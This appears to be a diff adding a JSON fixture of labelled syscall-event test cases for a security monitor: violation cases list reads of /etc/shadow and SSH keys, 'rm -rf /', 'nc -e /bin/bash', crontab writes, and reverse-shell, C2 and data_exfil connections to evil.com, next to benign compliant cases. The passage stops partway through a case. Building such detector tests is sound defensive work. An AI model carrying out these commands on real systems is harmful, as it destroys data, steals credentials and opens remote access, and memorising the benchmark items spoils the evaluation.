@@ -1,0 +1,5447 @@
+[
+  {
+    "case_id": "DV-000",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-001",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-002",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-003",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-004",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-005",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-006",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-007",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-008",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-009",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-010",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-011",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-012",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-013",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-014",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-015",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-016",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-017",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-018",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-019",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-020",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-021",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-022",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-023",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-024",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-025",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-026",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-027",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-028",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-029",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-030",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-031",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-032",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-033",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-034",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-035",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-036",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-037",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-038",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-039",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-040",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-041",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-042",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-043",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-044",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-045",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-046",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su - root"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "192.168.1.100:4444",
+        "params": "reverse_shell"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-047",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-048",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.99:31337",
+        "params": "C2_beacon"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-049",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-050",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-051",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-052",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-053",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-054",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-055",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-056",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/nc",
+        "params": "-e /bin/bash"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-057",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/crontab",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-058",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/proc/self/mem",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "data_exfil"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/bin/bash",
+        "params": "-c 'rm -rf /'"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DV-059",
+    "category": "deterministic_violation",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/id_rsa",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "DC-000",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-001",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-002",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-003",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-004",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-005",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-006",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-007",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-008",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-009",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-010",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-011",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-012",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-013",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
